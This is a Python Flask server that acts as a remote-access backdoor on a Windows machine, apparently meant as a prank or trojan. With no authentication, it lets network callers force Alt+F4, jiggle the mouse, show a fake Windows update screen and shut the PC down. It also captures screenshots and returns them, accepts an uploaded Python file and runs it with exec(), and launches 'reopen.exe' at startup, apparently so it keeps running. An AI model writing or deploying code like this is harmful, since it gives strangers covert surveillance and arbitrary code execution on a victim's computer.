from os.path import exists
import os
import keyboard
import time
from flask import Flask, request, render_template, send_file
from werkzeug.utils import secure_filename
import pyautogui
import ait
import pygame
app = Flask(__name__)
responsegood = '<img src="https://c.tenor.com/4Mv5tE-bc-4AAAAC/parks-and-rec-parks-and-recreation.gif" alt"haha"><p>ur do the <strong>good</strong></p>', 200
@app.route('/', methods=['GET','POST'])
def webhook():
    if request.method == 'GET':
        print("GET Request Received")
        print(request.headers)
        if "shake" in request.headers:
            shake()
            return responsegood
        elif "altf4" in request.headers:
            altf4()
            return responsegood
        elif "update" in request.headers:
            update()
            return responsegood
        elif "shutdown" in request.headers:
            shutdown()
            return responsegood
        elif "corner" in request.headers:
            corner()
            return responsegood
        elif "pause" in request.headers:
            pause()
            return responsegood
        else:
            return render_template('/ytblock/blocked.html')
    else:
        print('EXITING...')
        time.sleep(2)
        os._exit(0)
#press altf4
def altf4():
    keyboard.send("alt+F4")
#shake the mouse
def shake():
    ait.move(60j, -9j)
    time.sleep(0.1)
    ait.move(-30j, 10j)
    time.sleep(0.1)
    ait.move(10j, 50j)
    time.sleep(0.1)
    ait.move(-40j, -51j)
#fake windows update
def update():
    pygame.init()
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.load("error.mp4")
    pygame.mixer.music.play(1)
    keyboard.send('Win+R')
    time.sleep(0.1)
    keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
    keyboard.send('Enter')
    keyboard.send('Win+R')
    time.sleep(0.1)
    keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
    keyboard.send('Enter')
def shutdown():
    os.system("shutdown /s /t 1")
def corner():
    ait.move(2160j,1440j)
def pause():
    pyautogui.press('playpause')
@app.route("/block")
def block():
    return render_template('blocked.html')
@app.route('/screen')
def shot():
    sshotmain = pyautogui.screenshot()
    user = os.environ.get('USERNAME')
    print(user)
    tmpdir = "C:/Users/"+ user + "/AppData/Local/Temp/screenshot.png"
    print(tmpdir)
    sshotmain.save(tmpdir)
    return send_file(tmpdir, mimetype='image/gif')
@app.route('/screen/2')
def shot2():
    sshotmain2 = pyautogui.screenshot()
    user = os.environ.get('USERNAME')
    print(user)
    tmpdir = "C:/Users/"+ user + "/AppData/Local/Temp/screenshot.png"
    print(tmpdir)
    sshotmain2.save(tmpdir)
    return send_file(tmpdir, mimetype='image/gif')
@app.route('/upload')
def upload_file1():
   return render_template('upload.html')
@app.route('/uploader', methods = ['GET', 'POST'])
def upload_file():
   if request.method == 'POST':
      f = request.files['file']
      f.save(secure_filename('uploaded.py'))
      return render_template('successupload.html')
@app.route('/run')
def run():
    file_exists = exists('uploaded.py')
    if file_exists == True:
        exec(open("uploaded.py").read())
        return render_template('successrun.html')
    else:
        return 'No uploaded File'
@app.route('/upload/view')
def viewfile():
    file_exists = exists('uploaded.py')
    if file_exists == True:
        return send_file('uploaded.py', mimetype='text/plain')
    else:
        return 'no file found'
os.startfile("reopen.exe")
if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000)
#you can change the port it runs on^